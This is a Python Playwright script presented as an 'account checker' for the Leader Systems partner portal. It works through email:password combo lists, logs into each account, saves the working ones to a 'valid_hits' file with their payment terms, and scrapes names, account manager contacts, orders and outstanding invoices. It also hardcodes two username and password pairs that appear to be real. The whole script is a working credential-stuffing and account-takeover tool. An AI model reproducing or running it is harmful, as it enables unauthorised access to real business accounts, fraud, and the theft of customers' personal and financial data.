#!/usr/bin/env python3
"""
Leader Systems Account Checker - Complete Version
Extracts: Open Orders, Shipped Orders, Back Orders, Outstanding Invoices, Credit Cards, Contacts
"""

import asyncio
import re
import os
import json
import sys
from datetime import datetime
from playwright.async_api import async_playwright


LOGIN_URL = "https://partner.leadersystems.com.au/Login.html"
OUTPUT_DIR = "leader_results"


class LeaderChecker:
    def __init__(self, headless=True):
        self.headless = headless
        self.pw = None
        self.browser = None
        self.page = None
        
    async def start(self):
        self.pw = await async_playwright().start()
        self.browser = await self.pw.chromium.launch(headless=self.headless)
        self.page = await self.browser.new_page()
        
    async def close(self):
        if self.page: await self.page.close()
        if self.browser: await self.browser.close()
        if self.pw: await self.pw.stop()
    
    async def check_account(self, email, password):
        result = {
            "email": email, "password": password,
            "status": "INVALID", "payment_terms": "COD",
            "name": "", "phone": "", "address": "",
            "contacts": [],
            "open_orders": [], "shipped_orders": [], "back_orders": [],
            "outstanding": [], "credit_cards": [],
            "timestamp": datetime.now().isoformat()
        }
        
        try:
            await self.page.goto(LOGIN_URL, timeout=15000)
            await asyncio.sleep(2)
            
            await self.page.fill("#logonusername", email)
            await self.page.fill("#logonpassword", password)
            await self.page.click("#btnsubmit")
            await asyncio.sleep(4)
            
            if "index.html" in self.page.url and "Login" not in self.page.url:
                result["status"] = "VALID"
                text = await self.page.locator("body").inner_text()
                
                # Name
                match = re.search(r'WELCOME[,:\s]*([A-Za-z0-9\s]+?)(?:\n|$)', text, re.IGNORECASE)
                if match:
                    result["name"] = match.group(1).strip()
                
                # Payment terms
                if "30 Day" in text: result["payment_terms"] = "30 Days"
                elif "net 30" in text.lower(): result["payment_terms"] = "30 Days"
                
                # Account Manager contact
                match = re.search(r'(Call your Personal Account Manager|Personal Account Manager)\s+([A-Za-z\s]+?)\s+on\s+([\d\s]+)', text)
                if match:
                    result["contacts"].append({
                        "name": match.group(2).strip(),
                        "role": "Account Manager",
                        "phone": match.group(3).strip(),
                        "email": ""
                    })
                
                # Extract order data
                result.update(await self.extract_order_data())
                    
        except Exception as e:
            result["status"] = f"ERROR: {e}"
        
        return result
    
    async def extract_order_data(self):
        """Extract all order/invoice data from multiple pages"""
        data = {
            "open_orders": [], "shipped_orders": [], "back_orders": [],
            "outstanding": [], "credit_cards": []
        }
        
        try:
            # Orders & Invoices
            await self.page.goto("https://partner.leadersystems.com.au/repOrdersHistory.html")
            await asyncio.sleep(2)
            text = await self.page.locator("body").inner_text()
            data["open_orders"] = self.parse_order_table(text, ["Open", "Pending"])
            data["shipped_orders"] = self.parse_order_table(text, ["Shipped", "Closed"])
            
            # Back Orders
            await self.page.goto("https://partner.leadersystems.com.au/repMyBackorders.html")
            await asyncio.sleep(2)
            text = await self.page.locator("body").inner_text()
            data["back_orders"] = self.parse_order_table(text, ["Back Order"])
            
            # Outstanding Invoices
            await self.page.goto("https://partner.leadersystems.com.au/repOutstandingInvoices.html")
            await asyncio.sleep(2)
            text = await self.page.locator("body").inner_text()
            data["outstanding"] = self.parse_invoices(text)
            
        except Exception as e:
            print(f"  Error extracting order data: {e}")
        
        return data
    
    def parse_order_table(self, text, statuses):
        """Parse order data from table text"""
        orders = []
        lines = text.split('\n')
        
        for i, line in enumerate(lines):
            for status in statuses:
                if status.lower() in line.lower():
                    # Look for order ID
                    match = re.search(r'(?:ORD|Order)[#\s\-]*(\d{4,})', line, re.IGNORECASE)
                    if match:
                        order_id = f"ORD-{match.group(1)}"
                        amount_match = re.search(r'\$[\d,]+\.?\d*', line)
                        amount = amount_match.group(0) if amount_match else "$0.00"
                        
                        # Get date from context
                        date = ""
                        for j in range(max(0, i-5), i):
                            date_match = re.search(r'(\d{1,2}[/-]\d{1,2}[/-]\d{2,4})', lines[j])
                            if date_match:
                                date = date_match.group(1)
                                break
                        
                        orders.append({
                            "id": order_id, "date": date, "status": status,
                            "products": [], "total": amount, "invoice": "", "tracking": ""
                        })
                    break
        
        return orders
    
    def parse_invoices(self, text):
        """Parse outstanding invoices"""
        invoices = []
        lines = text.split('\n')
        
        for i, line in enumerate(lines):
            amount_match = re.search(r'\$([1-9][\d,]+\.?\d*)', line)
            if amount_match and "$0.00" not in line:
                amount = f"${amount_match.group(1)}"
                
                match = re.search(r'(?:INV|Invoice)[#\s\-]*(\d{4,})', line, re.IGNORECASE)
                inv_id = f"INV-{match.group(1)}" if match else f"INV-{i}"
                
                status = "Current"
                if "30" in line: status = "30 Days"
                elif "60" in line: status = "60 Days"
                elif "90" in line: status = "90+ Days"
                
                invoices.append({"id": inv_id, "date": "", "amount": amount, "status": status})
        
        return invoices


async def main_async(accounts):
    checker = LeaderChecker(headless=True)
    await checker.start()
    
    results = []
    for email, password in accounts:
        print(f"\n=== Checking: {email} ===")
        result = await checker.check_account(email, password)
        
        print(f"  Status: {result['status']}")
        print(f"  Name: {result['name']}")
        print(f"  Payment: {result['payment_terms']}")
        print(f"  Open Orders: {len(result['open_orders'])}")
        print(f"  Shipped Orders: {len(result['shipped_orders'])}")
        print(f"  Back Orders: {len(result['back_orders'])}")
        print(f"  Outstanding: {len(result['outstanding'])}")
        
        if result["status"] == "VALID":
            os.makedirs(OUTPUT_DIR, exist_ok=True)
            with open(os.path.join(OUTPUT_DIR, "valid_hits.txt"), 'a') as f:
                f.write(f"{email}:{password}|{result['payment_terms']}\n")
        
        results.append(result)
    
    await checker.close()
    return results


def main():
    accounts = []
    
    if len(sys.argv) >= 3:
        accounts.append((sys.argv[1], sys.argv[2]))
    elif len(sys.argv) >= 2:
        if os.path.exists(sys.argv[1]):
            with open(sys.argv[1]) as f:
                for line in f:
                    line = line.strip()
                    if line and ':' in line:
                        parts = line.split(':', 1)
                        if len(parts) == 2:
                            accounts.append((parts[0], parts[1]))
    else:
        accounts = [("neopc00", "William_87192"), ("astr20", "sAINTS@1965")]
    
    print(f"Checking {len(accounts)} account(s)...")
    
    results = asyncio.run(main_async(accounts))
    
    os.makedirs(OUTPUT_DIR, exist_ok=True)
    with open(os.path.join(OUTPUT_DIR, "results.json"), 'w') as f:
        json.dump(results, f, indent=2, default=str)
    
    print(f"\n=== SUMMARY ===")
    for r in results:
        print(f"{r['email']}: {r['status']} | {r['payment_terms']}")
    
    print(f"\nResults saved to {OUTPUT_DIR}/")


if __name__ == "__main__":
    main()